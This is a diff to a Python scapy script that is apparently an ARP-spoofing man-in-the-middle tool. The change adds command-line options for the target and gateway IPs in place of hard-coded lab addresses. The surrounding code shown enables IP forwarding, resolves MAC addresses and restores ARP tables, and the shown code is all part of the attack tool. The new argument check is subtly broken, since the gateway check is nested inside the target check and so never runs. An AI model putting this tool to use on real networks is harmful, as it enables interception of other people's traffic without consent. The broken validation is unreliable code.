@@ -4,6 +4,18 @@ import scapy.all as scapy
 import time
 import os
 import sys
+import optparse
+
+def get_arguments():
+    parser = optparse.OptionParser()
+    parser.add_option("-t", "--target", dest="target", help="Target IP")
+    parser.add_option("-g", "--gateway", dest="gateway", help="Gateway or Router IP")
+    (options, arguments) = parser.parse_args()
+    if not options.target:
+        parser.error("[-] Please specify a target IP. Use --help for more info.")
+        if not options.gateway:
+            parser.error("[-] Please specify a gateway or router IP. Use --help for more info.")
+    return options
 
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
@@ -27,12 +39,14 @@ def restore(destination_ip, source_ip):
     #sending packet 4x to clear ARP table
     scapy.send(packet, count=4, verbose=False)
 
+options = get_arguments()
+
 os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
 sent_packets_count = 0
 
-target_ip = "10.0.2.4"
-gateway_ip = "10.0.2.1"
+target_ip = options.target
+gateway_ip = options.gateway
 
 try:
     while True:
